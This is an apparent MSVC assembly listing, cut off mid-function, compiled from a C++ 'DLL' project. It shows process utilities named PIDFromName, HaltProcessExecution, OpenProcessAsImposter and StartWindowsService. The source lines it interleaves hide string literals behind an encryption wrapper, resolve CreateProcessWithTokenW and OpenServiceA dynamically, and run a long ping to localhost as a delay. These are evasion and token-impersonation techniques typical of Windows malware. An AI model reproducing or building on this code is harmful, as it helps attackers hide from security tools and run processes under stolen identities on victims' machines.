??__Fobfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4V45@A
	mov	rax, QWORD PTR [rax+rcx*8]

; 132  : 				m_data[i] = 0;

	mov	QWORD PTR [rax+rdx], 0
	mov	QWORD PTR [rax+rdx+8], 0
	ret	0
??__Fobfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	xorps	xmm0, xmm0
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rdx], xmm0
	mov	QWORD PTR [rdx+16], rax
	mov	BYTE PTR [rdx+24], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?HaltProcessExecution@ProcessUtilities@@YAXXZ
_TEXT	SEGMENT
obfuscator$1 = 32
?HaltProcessExecution@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::HaltProcessExecution, COMDAT

; 215  : void ProcessUtilities::HaltProcessExecution() {

$LN28:
	push	rbx
	sub	rsp, 64					; 00000040H

; 216  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	movdqa	xmm0, XMMWORD PTR __xmm@b4e9824d098f09bfaefb82435ecf50e1
	mov	DWORD PTR obfuscator$1[rsp+16], 261364223 ; 0f9419ffH
	mov	DWORD PTR obfuscator$1[rsp+20], -1477869478 ; a7e9805aH
	mov	DWORD PTR obfuscator$1[rsp+24], 1439979441 ; 55d457b1H
	mov	WORD PTR obfuscator$1[rsp+28], 37647	; 0000930fH
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN21@HaltProces
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+31], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 216  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	lea	rax, QWORD PTR [rbx+30]
	lea	rcx, QWORD PTR obfuscator$1[rsp+30]
	cmp	rbx, rcx
	ja	SHORT $LN18@HaltProces
	lea	rcx, QWORD PTR obfuscator$1[rsp]
	cmp	rax, rcx
	jb	SHORT $LN18@HaltProces
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$1[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	eax, DWORD PTR obfuscator$1[rsp+24]
	mov	DWORD PTR [rbx+24], eax
	movzx	eax, WORD PTR obfuscator$1[rsp+28]
	mov	WORD PTR [rbx+28], ax
	mov	BYTE PTR [rbx+30], 201			; 000000c9H
	jmp	SHORT $LN24@HaltProces
$LN18@HaltProces:
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$1[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	eax, DWORD PTR obfuscator$1[rsp+24]
	mov	DWORD PTR [rbx+24], eax
	movzx	eax, WORD PTR obfuscator$1[rsp+28]
	mov	WORD PTR [rbx+28], ax
	mov	BYTE PTR [rbx+30], 201			; 000000c9H
$LN24@HaltProces:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	jmp	SHORT $LN4@HaltProces
$LN21@HaltProces:
	lea	rbx, QWORD PTR [rdx+r8]
$LN4@HaltProces:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 140  : 			decrypt();

	mov	rcx, rbx
	call	?decrypt@?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAXXZ ; ay::obfuscated_data<31,-7365158476837733999,char>::decrypt
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 216  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	mov	rcx, rbx

; 217  : }

	add	rsp, 64					; 00000040H
	pop	rbx

; 216  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	jmp	system
?HaltProcessExecution@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::HaltProcessExecution
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$1 = 32
?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA PROC ; `ProcessUtilities::HaltProcessExecution'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA ENDP ; `ProcessUtilities::HaltProcessExecution'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ
_TEXT	SEGMENT
obfuscator$ = 32
this$dead$ = 80
??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ PROC ; `ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator(), COMDAT

; 216  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	push	rbx
	sub	rsp, 64					; 00000040H
	movdqa	xmm0, XMMWORD PTR __xmm@b4e9824d098f09bfaefb82435ecf50e1
	mov	DWORD PTR obfuscator$[rsp+16], 261364223 ; 0f9419ffH
	mov	DWORD PTR obfuscator$[rsp+20], -1477869478 ; a7e9805aH
	mov	DWORD PTR obfuscator$[rsp+24], 1439979441 ; 55d457b1H
	mov	WORD PTR obfuscator$[rsp+28], 37647	; 0000930fH
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4V45@A
	test	al, 1
	jne	$LN17@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+31], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 216  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	lea	rax, QWORD PTR [rbx+30]
	lea	rcx, QWORD PTR obfuscator$[rsp+30]
	cmp	rbx, rcx
	ja	SHORT $LN14@operator
	lea	rcx, QWORD PTR obfuscator$[rsp]
	cmp	rax, rcx
	jb	SHORT $LN14@operator
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	eax, DWORD PTR obfuscator$[rsp+24]
	mov	DWORD PTR [rbx+24], eax
	movzx	eax, WORD PTR obfuscator$[rsp+28]
	mov	WORD PTR [rbx+28], ax
	mov	BYTE PTR [rbx+30], 201			; 000000c9H
	jmp	SHORT $LN20@operator
$LN14@operator:
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	ecx, DWORD PTR obfuscator$[rsp+24]
	mov	DWORD PTR [rbx+24], ecx
	movzx	ecx, WORD PTR obfuscator$[rsp+28]
	mov	WORD PTR [rbx+28], cx
	mov	BYTE PTR [rbx+30], 201			; 000000c9H
$LN20@operator:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
$LN17@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ ENDP ; `ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$ = 32
this$dead$ = 80
?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	xorps	xmm0, xmm0
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rdx], xmm0
	mov	QWORD PTR [rdx+16], rax
	mov	DWORD PTR [rdx+24], eax
	mov	WORD PTR [rdx+28], ax
	mov	BYTE PTR [rdx+30], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ
_TEXT	SEGMENT
obfuscator$ = 32
this$dead$ = 80
??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ PROC ; `ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator(), COMDAT

; 230  : 	PPROCFN::_CreateProcessWithTokenW pCreateProcessWithTokenW = GetFunctionAddress<PPROCFN::_CreateProcessWithTokenW>(GetLoadedLib(freqDLLS::advapi32), std::string(HIDE("CreateProcessWithTokenW")));

	push	rbx
	sub	rsp, 64					; 00000040H
	movdqa	xmm0, XMMWORD PTR __xmm@8548e83236e44a0c8371da3524e45b20
	mov	DWORD PTR obfuscator$[rsp+16], 787381515 ; 2eee7d0bH
	mov	DWORD PTR obfuscator$[rsp+20], -243871452 ; f176d124H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4V67@A
	test	al, 1
	jne	SHORT $LN17@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+24], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 230  : 	PPROCFN::_CreateProcessWithTokenW pCreateProcessWithTokenW = GetFunctionAddress<PPROCFN::_CreateProcessWithTokenW>(GetLoadedLib(freqDLLS::advapi32), std::string(HIDE("CreateProcessWithTokenW")));

	lea	rax, QWORD PTR [rbx+23]
	lea	rcx, QWORD PTR obfuscator$[rsp+23]
	cmp	rbx, rcx
	ja	SHORT $LN14@operator
	lea	rcx, QWORD PTR obfuscator$[rsp]
	cmp	rax, rcx
	jb	SHORT $LN14@operator
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	jmp	SHORT $LN20@operator
$LN14@operator:
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
$LN20@operator:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
$LN17@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ ENDP ; `ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$ = 32
this$dead$ = 80
?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	xorps	xmm0, xmm0
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4V67@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rdx], xmm0
	mov	QWORD PTR [rdx+16], rax
	ret	0
??__Fobfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ PROC ; `ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator(), COMDAT

; 247  : 	PPROCFN::_OpenServiceA         pOpenServiceA = GetFunctionAddress<PPROCFN::_OpenServiceA>(advapi, std::string(HIDE("OpenServiceA")));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4V67@A
	test	al, 1
	jne	SHORT $LN26@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 21354202		; 0145d6daH
	mov	DWORD PTR [rbx], -103098466		; f9dad79eH
	mov	DWORD PTR [rbx+4], 190033430		; 0b53ae16H
	mov	WORD PTR [rbx+8], 50360			; 0000c4b8H
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 247  : 	PPROCFN::_OpenServiceA         pOpenServiceA = GetFunctionAddress<PPROCFN::_OpenServiceA>(advapi, std::string(HIDE("OpenServiceA")));

